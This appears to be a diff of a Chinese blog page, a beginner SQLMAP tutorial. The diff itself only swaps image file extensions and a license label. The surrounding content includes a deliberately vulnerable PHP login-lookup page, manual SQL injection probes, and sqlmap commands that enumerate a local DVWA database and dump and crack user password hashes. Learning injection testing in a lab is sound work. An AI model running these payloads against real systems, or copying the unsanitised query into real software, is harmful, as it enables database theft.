@@ -116,18 +116,18 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;Test Sql-injection&lt;/title&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line"></span><br><span class="line">		&lt;form action=<span class="comment"># method="GET"&gt;</span></span><br><span class="line">		&lt;input type=<span class="string">"text"</span> name=<span class="string">"id"</span> /&gt;</span><br><span class="line">		&lt;input type=<span class="string">"submit"</span> name=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">		</span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line">			<span class="keyword">require_once</span>(<span class="string">"conn.php"</span>);</span><br><span class="line">			<span class="keyword">if</span>( <span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]) )&#123;</span><br><span class="line">				$id = $_GET[<span class="string">"id"</span>];</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//query from db</span></span><br><span class="line">				$query = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">				$result = mysqli_query($conn, $query);</span><br><span class="line">		</span><br><span class="line">				<span class="keyword">if</span>( mysqli_num_rows($result) &gt; <span class="number">0</span> )&#123;</span><br><span class="line">					<span class="comment">//Get the data</span></span><br><span class="line">					<span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">"first name: "</span> . $row[<span class="string">"first_name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">"last name : "</span> . $row[<span class="string">"last_name"</span>]. <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			mysqli_close($conn);				</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- 此页面来熟悉 SQLMAP 的使用基本上没有什么阻碍 --&gt;</span><br></pre></td></tr></table></figure>
 
 <p><strong>正常访问页面</strong></p>
-<p><img src="ok.png" alt="ok"></p>
+<p><img src="ok.jpg" alt="ok"></p>
 <br>
 
 <p><strong>出错情况</strong></p>
 <p>使用 <code>1&#39; and 1=1 --</code></p>
-<p><img src="ok2.png" alt="ok2"></p>
+<p><img src="ok2.jpg" alt="ok2"></p>
 <p><br>使用 <code>1&#39; and 1=2 --</code></p>
-<p><img src="err.png" alt="err"></p>
+<p><img src="err.jpg" alt="err"></p>
 <p><br>使用 <code>1&#39; union select 1 --</code></p>
-<p><img src="err2.png" alt="err2"></p>
+<p><img src="err2.jpg" alt="err2"></p>
 <p><br>使用 <code>1&#39; union select 1,2 --</code></p>
-<p><img src="err3.png" alt="err3"></p>
+<p><img src="err3.jpg" alt="err3"></p>
 <p><br><strong>注：</strong></p>
 <p>1.注释时，<code>--</code> 后面要加一个或多个空格</p>
 <p>2.select 1,2 这种写法只在 MySQL 里比较好使，SQL Server 或者 Oracle 都应该使用 select null,null[…] 这种写法</p>
@@ -142,39 +142,39 @@
 <h3 id="使用-SQLMAP-查看数据库"><a href="#使用-SQLMAP-查看数据库" class="headerlink" title="使用 SQLMAP 查看数据库"></a>使用 SQLMAP 查看数据库</h3><blockquote>
 <p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –dbs</p>
 </blockquote>
-<p><img src="dbs.png" alt="dbs"></p>
+<p><img src="dbs.jpg" alt="dbs"></p>
 <br>
 
 <h3 id="使用-SQLMAP-查看当前数据库"><a href="#使用-SQLMAP-查看当前数据库" class="headerlink" title="使用 SQLMAP 查看当前数据库"></a>使用 SQLMAP 查看当前数据库</h3><blockquote>
 <p> sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –current-db</p>
 </blockquote>
-<p><img src="currentdb.png" alt="currentdb"></p>
+<p><img src="currentdb.jpg" alt="currentdb"></p>
 <br>
 
 <h3 id="使用-SQLMAP-爆出数据库-dvwa-中的表"><a href="#使用-SQLMAP-爆出数据库-dvwa-中的表" class="headerlink" title="使用 SQLMAP 爆出数据库(dvwa)中的表"></a>使用 SQLMAP 爆出数据库(dvwa)中的表</h3><blockquote>
 <p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –table -D “dvwa”</p>
 </blockquote>
-<p><img src="tables.png" alt="dvwa"></p>
+<p><img src="tables.jpg" alt="dvwa"></p>
 <br>
 
 <p><strong>如果 -D 不使用 <code>&quot;</code> 则会报错：</strong></p>
-<p><img src="noquote.png" alt="noquote"></p>
+<p><img src="noquote.jpg" alt="noquote"></p>
 <br>
 
 <h3 id="使用-SQLMAP-爆出表-users-的列"><a href="#使用-SQLMAP-爆出表-users-的列" class="headerlink" title="使用 SQLMAP 爆出表(users)的列"></a>使用 SQLMAP 爆出表(users)的列</h3><blockquote>
 <p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –columns -T “users” -D “dvwa”</p>
 </blockquote>
-<p><img src="columns.png" alt="columns"></p>
+<p><img src="columns.jpg" alt="columns"></p>
 <br>
 
 <h3 id="使用-SQLMAP-破解账户密码值"><a href="#使用-SQLMAP-破解账户密码值" class="headerlink" title="使用 SQLMAP 破解账户密码值"></a>使用 SQLMAP 破解账户密码值</h3><blockquote>
 <p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –dump -C “user,password,user_id” -T “users” -D “dvwa”</p>
 </blockquote>
-<p><img src="crack_md5.png" alt="crack_md5"></p>
+<p><img src="crack_md5.jpg" alt="crack_md5"></p>
 <br>
 
 <p><strong>也可以使用 MD5 网站解密，结果一致</strong></p>
-<p><img src="md5.png" alt="md5"></p>
+<p><img src="md5.jpg" alt="md5"></p>
 <br>
 
 <h3 id="查看-SQLMAP-保存在本地的-LOG-文件"><a href="#查看-SQLMAP-保存在本地的-LOG-文件" class="headerlink" title="查看 SQLMAP 保存在本地的 LOG 文件"></a>查看 SQLMAP 保存在本地的 LOG 文件</h3><blockquote>
@@ -183,11 +183,11 @@
 <p><strong>日志文件会保存执行过的命令，以及自动化产生的 payload 方便学习</strong></p>
 <br>
 
-<p><img src="log.png" alt="log"></p>
+<p><img src="log.jpg" alt="log"></p>
 <br>
 
 <p><strong>同时也会保存破解的 MD5 为 csv 文件</strong></p>
-<p><img src="csv.png" alt="csv"></p>
+<p><img src="csv.jpg" alt="csv"></p>
 <br>
 
 <p><strong>注：</strong></p>
@@ -207,7 +207,7 @@
       <a href="https://pwn4justice.github.io/2019/06/11/SQLMAP-新手教程（一）/">https://pwn4justice.github.io/2019/06/11/SQLMAP-新手教程（一）/</a>
     </p>
     <p class="copyright-item">
-      <span>许可协议: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
     </p>
   </div>
       <footer class="post-footer">
